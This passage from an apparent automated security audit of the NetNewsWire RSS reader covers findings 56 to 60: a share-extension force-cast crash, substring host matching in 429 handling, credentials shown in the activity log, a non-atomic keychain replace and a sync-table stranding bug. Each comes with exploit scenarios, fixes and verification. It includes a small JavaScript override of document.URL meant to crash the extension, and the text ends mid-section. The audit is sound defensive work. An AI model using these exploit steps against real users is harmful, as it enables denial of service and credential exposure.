3. **Article count limit:** `fetchArticlesForFeedID` issues an unbounded SQL `WHERE feedID = ?` — no `LIMIT` clause. No item count cap in the RSS parser. Nothing prevents a feed from returning 50,000 items.
4. **`SingleLineUILabelSizer`:** Used for feed names (≤100 chars — well-bounded) and date strings (format like "12:34 PM" — very compact). Much less concerning than title/summary.
5. **`ArticleStringFormatter.summaryCache`:** Keyed by `(articleID, accountID)` (compact), not by content — its entries are small.

**D. Defence probe:**
- The `emptyCache()` path fires on `.lowMemory`, which iOS sends *before* an OOM kill — so the cache is typically cleared before a crash. However, this is reactive: between the low-memory notification and the previous background event, the full unshrunk cache is live.
- For a realistic 50,000-item feed with avg 200-char titles: ~50,000 Swift String heap entries ≈ ~20–30 MB for the title sizer, ~15 MB for summaries — **35–50 MB** total. On older 2 GB devices this is meaningful pressure; on modern devices it's manageable but constitutes an input-driven unbounded allocation from a remote source, which per the rules is in scope.

**Classification:** The data path from a network-served RSS feed → unsanitised (except length) strings → unbounded in-memory cache is **real and confirmed**. There is no hard cap on the number of cache entries; the per-string truncation bounds per-entry size but not count. The eviction mechanism is purely reactive. This qualifies as an **input-driven unbounded allocation** from a remote attacker-controlled source.

Confidence is moderate (6/10) because: iOS's low-memory system provides a reactive mitigation; the per-entry size is bounded; achieving a true OOM requires extreme feed sizes AND prolonged scrolling without any app-background event; and the `SingleLineUILabelSizer` arm of the finding is much weaker (date strings and feed names are naturally compact).

### 56. [LOW] Force-cast of webpage-supplied URL crashes share extension
**Class:** CWE-754
**CWE:** CWE-754 - https://cwe.mitre.org/data/definitions/754.html
**File:** `iOS/ShareExtension/ShareViewController.swift:74-83`
**CVSS 3.1:** **3.1** (Low) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.78 (1 run agreed)

#### Description
The completionHandler at line 70 processes the NSDictionary returned by NSExtensionJavaScriptPreprocessingResultsKey. At line 77 the code extracts the nested 'NSExtensionJavaScriptPreprocessingResultsKey' dictionary and at line 80 it attempts to force-cast results["url"] to String with `as! String`. In Swift, if results["url"] is absent (nil) or is any non-String Objective-C type (NSNumber, NSNull, NSArray), the runtime unconditionally throws a fatal error and terminates the process. This value is produced by SafariExt.js executing in the context of the shared webpage. If SafariExt.js reads a DOM element or meta-tag whose value is absent or numeric, or if the page does not surface a 'url' key at all (e.g., a data: page or a page with a URL-less JS result), the force-cast path is reached with a non-String. Because the guard at line 74 only ensures pList is an NSDictionary and the guard at line 77 only ensures the inner dict exists, there is no upstream protection before the force cast.

#### Impact
A malicious (or simply non-standard) webpage shared via Safari can crash the NetNewsWire share extension before the user can interact with it. The extension process terminates and must be relaunched by the user, denying the share-extension feature for that URL. Because the crash happens inside the completionHandler closure before the extension stores any state, repeated sharing from the same page results in a persistent, repeatable denial of service of the pipeline stage.

#### Exploit scenario
An attacker publishes a webpage that, through SafariExt.js preprocessing, omits the 'url' key or sets it to a non-String (e.g., window.location.port as a Number). The victim opens the page in Safari and taps Share → NetNewsWire. SafariExt.js sends back a results dictionary whose 'url' value is nil or NSNumber. The completionHandler at line 70 is invoked; execution reaches line 80 where `nil as! String` raises a fatal Swift runtime error. The extension process crashes immediately, the share sheet dismisses with an error, and the user cannot subscribe to the feed. The crash is reliably reproducible every time the user tries to share that URL.

#### Preconditions
- User explicitly initiates a share action from a webpage via the iOS share sheet targeting NetNewsWire
- The SafariExt.js JavaScript preprocessor returns a results dictionary where 'url' is nil, absent, or a non-String Objective-C type (influenced by the shared webpage's DOM or URL structure)

```
guard let results = dataGraph["NSExtensionJavaScriptPreprocessingResultsKey"] as? NSDictionary else {
    return
}
if let url = URL(string: results["url"] as! String) {  // CRASH: force-cast; nil or non-String → fatal error
    self?.url = url
}
```

#### How to fix
Replace the force cast with a conditional cast: `if let urlString = results["url"] as? String, let url = URL(string: urlString) { self?.url = url }`. This eliminates the crash for any non-String or absent value and degrades gracefully. The guard at line 74 or line 77 is not sufficient because it only checks outer dictionary types, not individual value types.

**Exploitability:** iOS Share Extension force-casts results['url'] to String identically to finding 12. CVSS 3.1 (AV:N/AC:H/A:L). Crashes the extension process only; main app is unaffected.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 6/10) — Force-cast `results["url"] as! String` is confirmed at line 80; if a malicious page overrides `document.URL` to return a non-String in Safari's extension JS context, the share extension process crashes (DoS only; no data exposure or privilege escalation)

Now I have enough information to analyze this thoroughly.

**A — What the code actually does (line 80):**

```swift
if let url = URL(string: results["url"] as! String) {
```

`results` is `NSDictionary`. Subscripting an `NSDictionary` returns `Any?`. Force-casting `nil as! String` is a fatal Swift runtime error. The defect is confirmed exactly as described.

**B — Walking the call chain to the entry point:**

The path is: Safari iOS Share Sheet → `NSItemProvider.loadItem` → `completionHandler` → line 80. The entry point is a user sharing a web page from Safari to NetNewsWire. This is unambiguously external and user-reachable.

**C — Searching for defences:**

- Line 74 guard: checks `pList is NSDictionary` — does NOT guard the type of nested values.
- Line 77 guard: checks the inner dict exists — does NOT guard the type of `results["url"]`.
- No validation of `results["url"]` type before the force-cast.

**D — Probing the source of the value:**

`SafariExt.js` always calls:
```javascript
arguments.completionFunction({ "url": document.URL });
```

`document.URL` is a `USVString` DOM attribute — always a string in standard usage. **However**, the preprocessor script runs in the *page's* JavaScript context. A malicious page can attempt `Object.defineProperty(Document.prototype, 'URL', { get: () => 42 })`. If the property is configurable in Safari's WebKit (which is version-dependent — WebKit has historically marked it `configurable: true`), the extension would call `completionFunction({ "url": 42 })`. The number 42 would arrive as `NSNumber` in the `NSDictionary`, and `NSNumber as! String` is a fatal crash.

The impact, however, is purely **DoS of the share extension process** — the share sheet dismisses with an error. No data is leaked, no auth is bypassed, no code executes in the host app. The main app is completely unaffected (extension runs in its own sandboxed process).

This aligns with the out-of-scope rule "Crashes…that don't expose data or grant access" only partially — this crash *is* externally triggerable via a crafted page, not just misconfiguration. But the ceiling is clearly limited availability: the victim simply cannot subscribe to that feed from that page. The defect is real and the force-cast should be replaced with `as? String`, but the security impact is marginal.

Confidence is moderate (6/10): the crash code path is confirmed, but exploiting it requires the page to successfully override `document.URL` in Safari's extension JS context, which depends on WebKit's property descriptor for that attribute.

### 57. [LOW] Substring host match for 429 handling cancels unrelated feeds
**Class:** CWE-183
**CWE:** CWE-183 - https://cwe.mitre.org/data/definitions/183.html
**File:** `Modules/RSWeb/Sources/RSWeb/DownloadSession.swift:412-428`
**CVSS 3.1:** **3.1** (Low) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.75 (1 run agreed)

#### Description
In `cancelAndRemoveTasksWithHost(_:in:)`, the code determines which in-progress tasks to cancel by checking `taskHost.contains(lowercaseHost)` where `lowercaseHost` is the host of the server that returned the 429 response. Because Swift's `String.contains` performs a substring search, a feed server at `ample.com` (host = `"ample.com"`) would match tasks for `example.com` (since `"example.com".contains("ample.com")` is `true`). The 429 host is derived from the URL that returned the 429 via `createHTTPResponse429`, and the retryAfter duration is taken from the server-supplied `Retry-After` header — both fully attacker-controlled. The subsequent `requestShouldBeDroppedDueToActive429` check uses an exact-match dictionary lookup so future requests are not blocked, but in-flight tasks for the current session are already canceled.

#### Impact
A feed server the user subscribes to can cancel in-flight downloads for unrelated, legitimate feed URLs whose hostname happens to contain the attacker's hostname as a substring. This causes a silent mid-session DoS for those feeds, silently dropping their data for the current refresh cycle.

#### Exploit scenario
A user subscribes to a feed at `ample.com` (attacker-controlled) in addition to legitimate feeds at `example.com`. During a sync refresh session, `ample.com` returns HTTP 429. `cancelAndRemoveTasksWithHost("ample.com")` iterates over all pending/in-progress tasks and cancels any whose host contains the substring `ample.com`, including tasks for `example.com`. Those feeds silently produce no new articles for that refresh cycle. The attacker can repeat this every refresh to persistently suppress article delivery.

#### Preconditions
- User subscribes to a feed controlled by the attacker at a hostname that is a substring of a legitimate feed's hostname (e.g., attacker at `ample.com`, victim at `example.com`)
- Both feeds are refreshed in the same DownloadSession cycle so the legitimate task is in-flight when the 429 is received

```
let tasksToRemove = tasks.filter { task in
    guard let taskHost = task.lowercaseHost else {
        return false
    }
    return taskHost.contains(lowercaseHost)  // substring match — too broad
}
```

#### How to fix
Replace the substring check with an exact host match or suffix match: `taskHost == lowercaseHost || taskHost.hasSuffix("."+lowercaseHost)`. This mirrors the domain-matching logic already used in `SpecialCase.urlStringMatchesDomain` and prevents a short attacker hostname from matching unrelated hosts.

**Exploitability:** cancelAndRemoveTasksWithHost uses String.contains (substring match) for 429-throttling; a server at 'ample.com' inadvertently cancels in-flight tasks for 'example.com'. CVSS 3.1 (AV:N/AC:H/A:L). Temporary availability impact limited to in-flight tasks for the current session.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — `String.contains` performs a substring match; attacker-controlled feed at `ample.com` returning 429 cancels in-flight tasks for `example.com`; no existing defence guards the `cancelAndRemoveTasksWithHost` path before the substring check

**Analysis**

**A. Verify the actual code (lines 412-428)**

The code is exactly as the scanner reports. At line 420:
```swift
return taskHost.contains(lowercaseHost)
```
Swift's `String.contains(_:)` performs a **substring search**, not an equality check. `"example.com".contains("ample.com")` returns `true`.

**B. Trace the call chain**

- `handle429Response(_:_:)` (line 371) is called when a URLSession response is received
- It builds an `HTTPResponse429` whose `.host` is `url.host()?.lowercased()` — the raw hostname from the server that returned 429
- Calls `cancelAndRemoveTasksWithHost(message.host)` which fans out to both `tasksInProgress` and `tasksPending`
- `task.lowercaseHost` (extension at line 516) also uses `url.host()?.lowercased()`, so both sides of the comparison are pure hostnames (no scheme/path)
- The feed refresh path (`LocalAccountRefresher.refresh`) is an external entry point — any subscribed feed server controls its HTTP response

**C. Try to kill the finding**

- `requestShouldBeDroppedDueToActive429` (line 431) uses exact-match `retryAfterMessages[host]` — this correctly guards **future** requests but does **not** protect in-flight tasks (already canceled)
- No allow-list or validation gates the host before `cancelAndRemoveTasksWithHost` is called
- No auth/authz gate — any subscribed feed can return 429
- Not test-only code; this is production network logic

**D. Probe edge cases**

The substring relationship is real: `"example.com".contains("ample.com")` → `true`. Attacker registers `ample.com`, user subscribes to both `ample.com` and `example.com`; during a concurrent refresh, `ample.com` returns 429 and the in-flight `example.com` tasks get canceled. Since `requestShouldBeDroppedDueToActive429` is keyed on exact host, only the current session's tasks are disrupted — not future refreshes — but an attacker can repeat the suppression every refresh cycle persistently.

**Mitigating factors:**
- Requires a contrived hostname substring relationship (e.g., `ample.com` ⊂ `example.com`)
- Impact is limited to temporary availability disruption (no data leak, no code execution, no auth bypass)
- User must actively subscribe to the attacker's feed

The bug is confirmed real. The fix is trivially `taskHost == lowercaseHost` instead of `.contains`.

### 58. [LOW] Credentials in error localizedDescription exposed in activity log
**Class:** CWE-312: Cleartext Storage of Sensitive Information
**CWE:** CWE-312: Cleartext Storage of Sensitive Information - https://cwe.mitre.org/data/definitions/312.html
**File:** `Shared/ActivityLog/ActivityLogViewModel.swift:65-67`
**CVSS 3.1:** **3.3** (Low) — `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *AV:L (non-network)*
**Confidence:** 0.62 (1 run agreed)

#### Description
At line 66, `error.localizedDescription` is interpolated directly into a text segment with no filtering. `URLError` objects produced by `URLSession` frequently include the full request URL in their description, and private-feed URLs commonly carry `user:password@` authority components. Similarly, authentication errors from Feedbin, Feedly, NewsBlur, or ReaderAPI can embed Bearer tokens, API keys, or nonces in their NSError `localizedDescription`. Because `ActivityLogViewModel.segments(for:)` is called for every completed or failed `Activity`, any Activity backed by such an error will carry the credential into the rendered log. The parallel path at lines 89–90 (`refreshFeedContent(let feedURL)`) directly surfaces the raw feed URL as secondary detail text, repeating the same exposure for URL-embedded credentials.

#### Impact
If a feed URL contains embedded credentials (e.g., https://user:[REDACTED-URL-CRED]@host/feed.rss) or a sync-service authentication error embeds token/password material in its localized description, those secrets are written verbatim into activity-log text segments visible in the UI. A user who screenshots, copy-pastes, or otherwise shares the activity log for support purposes inadvertently exposes credentials.

#### Exploit scenario
A user configures a private feed using a URL of the form `https://alice:[REDACTED-URL-CRED]@private.example.com/feed.rss`. The feed fetch fails with an HTTP 401, producing a `URLError` whose `localizedDescription` contains the full URL. `ActivityLogViewModel.segments(for:)` appends ` — The operation couldn't be completed. (https://alice:[REDACTED-URL-CRED]@private.example.com/feed.rss)` as a red failure segment. The user then shares a screenshot of the activity log in a bug report or community forum, exposing the password. The same scenario applies with OAuth refresh-token strings if a sync-service SDK embeds them in error messages.

#### Preconditions
- User must have configured a feed or sync service whose URL contains embedded credentials OR whose SDK embeds sensitive token material in NSError.localizedDescription
- Attacker must either have local/screen access to the device, or the user must share a copy of the activity log (e.g., for support)

```
if isFailed, let error = activity.error {
    result.append(ActivityLogTextSegment(text: " — \(error.localizedDescription)", color: .failure, weight: .regular))
}
```

#### How to fix
Before interpolating error.localizedDescription into any user-visible or shareable string, strip URL-embedded credential components using URLComponents: clear .user and .password before displaying. Consider replacing raw localizedDescription with a sanitized error kind string that omits the URL entirely. Apply the same sanitisation to feedURL strings emitted at line 89–90 (strip .user/.password from the URLComponents of feedURL before appending it to the segment array).

**Exploitability:** ActivityLogViewModel interpolates error.localizedDescription (which URLSession includes full request URLs with potential user:password@ credentials) into the visible Activity Log. CVSS 3.3 (AV:L/AC:L/PR:N/UI:R/C:L). Requires local access to open the Activity Log; no remote exfiltration path.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 8/10) — `feed.url` is stored and rendered without credential-stripping; `ActivityKind.refreshFeedContent(feedURL: feed.url)` directly surfaces raw URLs (including `user:pass@host` components) in the activity log with no sanitization, exploitable via social-engineering the user to share the log.

I have enough evidence. Here is my analysis:

---

**Analysis**

**A. What the code actually does (line 65–67, `ActivityLogViewModel.swift`)**

Confirmed exact match with the scanner's snippet. At line 66, `error.localizedDescription` is interpolated verbatim into a red "failure" text segment with no sanitization. At lines 89–90, `feedURL` (the raw URL string from the `ActivityKind` enum) is returned as secondary detail text when `activity.detail != nil`.

**B. Tracing the call chain outward**

**Path 1 — explicit URL-in-error construction:**  
`LocalAccountRefresher.downloadSession(_:httpError:url:)` (line 357) explicitly builds:
```swift
let errorMessage = "HTTP \(statusCode) \(statusDescription): \(url.absoluteString)"
let error = NSError(domain: "NetNewsWire", code: statusCode,
                    userInfo: [NSLocalizedDescriptionKey: errorMessage])
```
This error then flows via `reportFeedRefreshError` → `ActivityLog.shared.didFail(...)` → `activity.error` → line 66 of the view model → on-screen activity log.

Caveat: URLSession typically strips `user:password@` from URLs in its delegate callbacks, so `url.absoluteString` at line 357 is likely already sanitized *by the OS*. This weakens this specific error path.

**Path 2 — `feed.url` in `ActivityKind`:**  
Confirmed at multiple sites: `ActivityKind.refreshFeedContent(feedURL: feed.url)`. The `feed.url` is the raw string stored when the user subscribed — **never sanitized by the app**. This URL flows into:
- `displayName(detail:)` at `ActivityKind.swift` line 141: `String(format: format, detail ?? feedURL)` — shown when detail is nil
- `secondaryDetail(for:)` at `ActivityLogViewModel.swift` line 90: returns `feedURL` directly when `detail != nil`

Both code paths surface the raw `feed.url` (with any embedded `user:pass@host` credentials) in the rendered activity log.

**C. Searching for defenses**

- **No URL sanitization**: No code removes or redacts `userinfo` components from feed URLs before storing or displaying them.
- **No filtering at the log layer**: `ActivityLogViewModel.segments(for:)` does no credential scrubbing.
- **Privacy warning exists but is generic** (`ActivityLogView.swift` line 62–65): warns "Activity may contain feed URLs and other information you may not want to share publicly" — doesn't specifically call out that embedded credentials in URLs will be visible.
- **Copy Contents button** (`ActivityLogView.swift` line 43–45 and `ActivityLogWindowController.swift` line 98–100): explicitly allows copying the full log, including any credential-bearing URLs.

**D. Can edge-cases bypass?**

No bypass needed — the vulnerability is the absence of any mitigation. Every `refreshFeedContent` activity for a credentialed feed URL will surface that URL in the rendered log on both iOS and macOS.

**Impact assessment**

- **Attack vector**: Local — requires physical/screen access OR user shares log copy.  
- **Precondition**: User must have subscribed to a feed via a `user:password@host` URL (still used by some self-hosted RSS services and HTTP Basic Auth feeds).  
- **Realistic scenario**: User screenshots or pastes activity log to a support forum → password exposed.  
- **The privacy warning does not specifically warn about embedded credentials**, so users are unlikely to redact them before sharing.

---

### 59. [LOW] Non-atomic delete-then-add destroys credential on transient keychain error
**Class:** CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)
**CWE:** CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition) - https://cwe.mitre.org/data/definitions/362.html
**File:** `Modules/Secrets/Sources/Secrets/CredentialsManager.swift:93-104`
**CVSS 3.1:** **3.7** (Low) — `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.78 (1 run agreed)

#### Description
storeCredentials() handles the errSecDuplicateItem case (existing keychain item) with a two-phase replace: (1) SecItemDelete the old item, (2) SecItemAdd the new item. Three defects interact here:

1. The return value of SecItemDelete (line 96) is silently discarded. If the delete fails with a transient error, the old item is still present, the subsequent SecItemAdd at line 98 returns errSecDuplicateItem (handled as a fatal error, thrown immediately), and the stored credential is unchanged — but the error is still surfaced to the caller.

2. More critically: the post-delete SecItemAdd at line 98 has NO retry wrapper equivalent to the one on lines 66–74. If SecItemDelete succeeds (old item gone) but the subsequent SecItemAdd encounters a transient error, the code throws immediately and returns. There is no rollback and no retry. The credential now does not exist in the keychain.

3. The retry logic (lines 66–74) repeatedly calls SecItemAdd. If the first call at line 64 partially writes the item before returning a transient error code, the retry at line 69 will see errSecDuplicateItem (the partial write succeeded), which is treated as non-transient, and the code falls through to the delete+re-add path, unnecessarily deleting and re-adding a credential that was already successfully stored.

Data flow: OAuth token received from network (e.g., Feedly `refreshAccessToken` response, FeedlyAccountDelegate.swift:922) → `account.storeCredentials(grant.accessToken)` → `CredentialsManager.storeCredentials` → errSecDuplicateItem on first add → SecItemDelete (return value discarded, line 96) → SecItemAdd (no retry, line 98) → transient error → throw, credential permanently absent.

#### Impact
If SecItemDelete at line 96 succeeds but the subsequent SecItemAdd at line 98 fails with a transient error, the credential is permanently gone — deleted but never replaced. During an OAuth access-token refresh (Feedly, ReaderAPI) this silently and irreversibly removes the stored token, forcing the user to re-authenticate from scratch with no diagnostic beyond a logged error.

#### Exploit scenario
A Feedly user's OAuth access token expires; FeedlyAccountDelegate.reauthorizeFeedlyAPICaller() fetches a new token from feedly.com and calls storeCredentials. SecItemAdd returns errSecDuplicateItem (old token still stored). SecItemDelete at line 96 deletes the old token. At this exact moment the keychain experiences a transient write error (e.g., device under memory pressure during background refresh), and the SecItemAdd at line 98 returns a non-success, non-duplicate status. No retry is attempted, a CredentialsError.keychainStoreFailure is thrown, and the keychain now contains neither the old (deleted) nor the new token. All future API calls fail authentication; the only recovery is removing and re-adding the account.

#### Preconditions
- A credential already exists in the keychain for the target (server, username, type) tuple, so SecItemAdd returns errSecDuplicateItem on the initial store attempt
- A transient keychain error occurs during the post-delete SecItemAdd window (e.g., memory pressure, I/O contention, background process interruption on iOS)
- The caller does not implement its own retry/fallback around storeCredentials

```
// Remove kSecValueData so the delete matches by identity
var deleteQuery = query
deleteQuery.removeValue(forKey: kSecAttrAccessible as String)
deleteQuery.removeValue(forKey: kSecValueData as String)
SecItemDelete(deleteQuery as CFDictionary)   // return value silently discarded

let addStatus = SecItemAdd(query as CFDictionary, nil)   // no retry; if this fails after delete, credential is gone
if addStatus != errSecSuccess {
    // throws — but old credential was already deleted
    throw error
}
```

#### How to fix
The post-delete SecItemAdd at line 98 must be wrapped in the same retry loop used for the initial add (lines 66–74). Additionally, the return value of SecItemDelete at line 96 should be checked and retried on transient errors before the add is attempted. As an alternative, use SecItemUpdate (which is atomic) instead of the delete+re-add pattern: build an attributesToUpdate dictionary containing only kSecValueData and call SecItemUpdate(lookupQuery, attributesToUpdate) directly. This eliminates the window where neither the old nor the new credential exists.

**Exploitability:** storeCredentials delete-then-add is non-atomic; if SecItemDelete succeeds but SecItemAdd encounters a transient error, the credential is permanently gone with no retry or rollback. Causes silent sync failures on Feedly token rotation. CVSS 3.7 (AV:N/AC:H/A:L). Availability-only; no credential disclosure path.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 9/10) — all three logic defects are confirmed in the actual source; the post-delete non-retried `SecItemAdd` can permanently destroy a credential on a transient keychain error, reachable via the Feedly background OAuth refresh network path with no caller-side mitigation

Now I have the full picture. Let me work through each claim against the actual code.

**A. What the code actually does (lines 46–104)**

The flow is:
1. **Lines 64–74**: `SecItemAdd` with a retry loop (up to 4 retries with exponential back-off). Transient errors are retried; `errSecSuccess` and `errSecDuplicateItem` exit the loop.
2. **Lines 76–86**: Switch on final status — `errSecSuccess` → return; `errSecDuplicateItem` → fall through to update path; anything else → throw.
3. **Lines 93–96**: Build `deleteQuery` (stripping `kSecAttrAccessible` and `kSecValueData`), call `SecItemDelete` — **return value is silently discarded**.
4. **Lines 98–104**: Single `SecItemAdd` — **no retry wrapper**. If it fails, throw immediately, and the old credential is already gone.

`isTransientKeychainError` at line 37–44 explicitly returns `false` for `errSecSuccess`, `errSecItemNotFound`, and `errSecDuplicateItem` — only non-zero, non-duplicate, non-notfound OSStatus values are considered transient.

**B. Entry points confirmed**

The Feedly background-refresh path is real: `FeedlyAccountDelegate.reauthorizeFeedlyAPICaller` (line 904 onwards in FeedlyAccountDelegate.swift) calls `account.storeCredentials(newAccessCredentials)` after fetching a new OAuth token over the network. This is triggered automatically in the background on iOS. Multiple UI paths also call it directly.

**C. Claim-by-claim assessment**

| Claim | Verdict |
|---|---|
| **Claim 1** – `SecItemDelete` return discarded; delete failure leaves old item, next `SecItemAdd` gets `errSecDuplicateItem`, thrown as fatal error | **CONFIRMED** — but in this sub-case the old credential is still intact; the operation fails but data is not lost. The UX is a spurious error. |
| **Claim 2** – Post-delete `SecItemAdd` has no retry; if delete succeeds and add encounters a transient error, credential is permanently absent | **CONFIRMED** — this is the critical defect. Lines 98–104 have a single non-retried call. `SecItemUpdate` would be the atomic alternative; without it, the delete-then-add window is unprotected. |
| **Claim 3** – A partial write from the initial `SecItemAdd` returning a transient code could trigger the delete+re-add path unnecessarily | **CONFIRMED** — `isTransientKeychainError` treats `errSecDuplicateItem` as non-transient; if a partial-success write returns a different non-success code that IS transient, retries occur; if the retries see `errSecDuplicateItem` (because the partial write actually committed), the code falls through to delete+re-add of a credential that's already stored. |

**D. Defences probed**

No retry exists on the post-delete path (confirmed by reading lines 93–104). No caller wraps `storeCredentials` with its own retry — `FeedlyAccountDelegate` at lines 928/932 calls it with a bare `try`. `ReaderAPIAccountDelegate` at line 142 uses `try?` (silently swallows errors), so credential loss there is silent. The correct fix is `SecItemUpdate` for the duplicate case, which is atomic.

**Impact assessment**

- Trigger condition: memory pressure / I/O contention on iOS during background OAuth token refresh — plausible on iOS under heavy load.
- Consequence: OAuth access token for account (Feedly, ReaderAPI, etc.) permanently absent from keychain; all subsequent API calls fail auth; user must remove and re-add account to recover.
- This is an **availability** impact on stored credentials — no data exfiltration, no privilege escalation; limited in scope but concrete and unrecoverable without manual intervention.

### 60. [LOW] UPDATE-all before SELECT-with-LIMIT strands rows in selected=true state
**Class:** CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition)
**CWE:** CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization (Race Condition) - https://cwe.mitre.org/data/definitions/362.html
**File:** `Modules/SyncDatabase/Sources/SyncDatabase/SyncStatusTable.swift:17-44`
**CVSS 3.1:** **3.1** (Low) — `CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N`
**OffensivePriority:** **P3** - Internal Network / Privileged Position | *exposure unverified — no CMDB context; AV:N (network-routable; internet exposure unconfirmed)*
**Confidence:** 0.78 (1 run agreed)

#### Description
selectForProcessing first issues an unconditional UPDATE that flips every row in the table to selected=true (line 20-24), then—within the same transaction—issues a SELECT that may return only `limit` rows (lines 26-32). After the transaction commits (line 41), only the returned rows are handed back to the caller. The caller is expected to delete them via deleteSelectedForProcessing, leaving the non-returned rows in the table with selected=true. selectPendingReadStatusArticleIDs and selectPendingStarredStatusArticleIDs (both of which delegate to selectPendingArticleIDs at line 116) query 'where selected == false', so those stuck rows are completely invisible to any caller relying on the pending-check helpers to drive subsequent sync iterations. The design intent—that 'selected=true means in-flight'—is defeated for items that were collateral-marked but never included in the returned batch. The article IDs populating the syncStatus table arrive from remote sync services (Feedbin, Feedly, NewsBlur, ReaderAPI) whose responses are the untrusted entry point; the correctness decision (are there still items to sync?) is made in selectPendingArticleIDs, which reads the already-corrupted selected flag.

#### Impact
When a limit is supplied, all rows are marked selected=true but only a subset is returned for processing. Non-returned rows are then invisible to selectPendingReadStatusArticleIDs/selectPendingStarredStatusArticleIDs (which filter on selected==false), so a caller that uses those functions to decide whether further sync is needed will conclude 'nothing pending' and abandon the remaining items. Article read/starred status changes sourced from a remote sync service can be silently dropped for the remainder of the current sync pass.

#### Exploit scenario
A Feedbin account has 500 unread-status changes pending upload. The sync engine calls selectForProcessing(limit: 100): the UPDATE marks all 500 rows selected=true, the SELECT returns the first 100, those 100 are processed and deleted. The sync engine then calls selectPendingReadStatusArticleIDs to decide whether another batch is needed; the query finds zero rows with selected==false and returns an empty set. The engine concludes syncing is complete and stops. The remaining 400 read-status changes sit in the table with selected=true forever (or until the next full app restart triggers selectForProcessing again), meaning the server never receives those status updates and the user's read state diverges between devices.

#### Preconditions
- selectForProcessing must be called with a non-nil limit value smaller than the total number of pending rows
- The calling sync logic must use selectPendingReadStatusArticleIDs or selectPendingStarredStatusArticleIDs as the sentinel to decide whether to issue another selectForProcessing call, rather than checking selectPendingCount or looping until an empty result set is returned from selectForProcessing itself

```
let updateSQL = "update \(name) set selected = true"   // marks ALL rows
guard database.executeUpdate(updateSQL, withArgumentsIn: nil) else {
    database.rollback()
    return nil
}

let selectSQL = {
    var sql = "select * from \(name) where selected == true"
    if let limit {
        sql = "\(sql) limit \(limit)"   // returns only 'limit' rows, rest stay selected=true
    }
    return sql
}()
```

#### How to fix
Change the UPDATE to mark only the rows that will actually be selected. One safe pattern: INSERT the to-be-processed article IDs into a temporary table (or use a CTE), then UPDATE only those rows. Alternatively, change the UPDATE to mirror the LIMIT: 'UPDATE syncStatus SET selected = true WHERE rowid IN (SELECT rowid FROM syncStatus WHERE selected = false LIMIT ?)' so that exactly the rows that will be returned are flagged, and no more.

**Exploitability:** SyncStatusTable.selectForProcessing marks all rows selected=true before applying LIMIT, leaving non-returned rows permanently stuck and invisible to pending-check queries. Causes incomplete sync convergence under load. CVSS 3.1 (AV:N/AC:H/PR:L/I:L). Integrity-only; requires specific concurrency timing.

#### Adversarial verification
**Verdict:** TRUE_POSITIVE (confidence: 6/10) — The UPDATE-all / SELECT-LIMIT stranding is real and confirmed in code; only the CloudKit path (not Feedbin as stated) is exploitable; impact is transient sync-state integrity corruption when an error interrupts the recursive batch loop and a concurrent CloudKit push arrives before the next sync cycle resets state.

Now I have all the evidence I need. Let me synthesize the findings.

**A. What the code actually does (confirmed)**

Lines 17-44 of `SyncStatusTable.swift` match the scanner's description exactly:
- `UPDATE syncStatus SET selected = true` — unconditionally flips **every** row
- `SELECT * FROM syncStatus WHERE selected == true LIMIT ?` — returns only `limit` rows
- Transaction commits, leaving overflow rows in `selected = true`

`selectPendingArticleIDs` (line 116) queries `WHERE selected == false AND key = "..."`, so any stranded `selected=true` rows are invisible to `selectPendingReadStatusArticleIDs` / `selectPendingStarredStatusArticleIDs`.

**B. Caller analysis**

| Caller | Uses limit? | Exploit path? |
|--------|------------|--------------|
| `FeedbinAccountDelegate` (line 117) | **No** — `selectForProcessing()` with no arg | No stranding |
| `NewsBlurAccountDelegate` (line 116) | **No** | No stranding |
| `FeedlyAccountDelegate` (line 211) | **No** | No stranding |
| `ReaderAPIAccountDelegate` (line 187) | **No** | No stranding |
| `CloudKitSendStatusOperation` (line 81) | **Yes — `limit: blockSize` (150)** | Stranding possible |

The scanner's Feedbin exploit scenario is factually wrong — Feedbin never passes a limit. The only caller that triggers the flaw is CloudKit.

**C. Does CloudKit's recursion fix it?**

`CloudKitSendStatusOperation.selectForProcessing()` recurses after each successful batch (line 90). In the happy path, subsequent calls mark the already-`true` rows `true` again (idempotent) and return the next 150 — so all rows get processed eventually.

But two early-return paths **break the recursion**:

1. `processStatuses` returns `nil` (articles not found, line 86) → early `return (0, 0)`, no recursion, overflow rows stranded with `selected=true` (the nil path does `deleteSelectedForProcessing` for the batch but stops)
2. `processStatuses` throws (CloudKit error, line 86) → error propagates, no recursion, overflow rows stranded (the batch is `resetSelectedForProcessing`'d but overflow is not)

**D. Real impact of stranding in CloudKit**

`CloudKitArticlesZoneDelegate.cloudKitDidModify` (lines 57-92) calls `selectPendingReadStatusArticleIDs` / `selectPendingStarredStatusArticleIDs` to build a **conflict-avoidance set** — server-incoming changes for articles in this set are skipped so local pending changes aren't overwritten. Stranded `selected=true` rows disappear from this set, causing CloudKit to **apply server-side read/starred states for articles that have uncommitted local changes**, corrupting sync state.

**Recovery mitigations:**
- `resetAllSelectedForProcessing()` is called in `CloudKitAccountDelegate.accountDidInitialize()` (line 639) — so an app restart / account reinit heals stranded rows
- Next successful sync cycle reprocesses them regardless

**Confidence calibration:**
- The code flaw is real and confirmed (10/10)
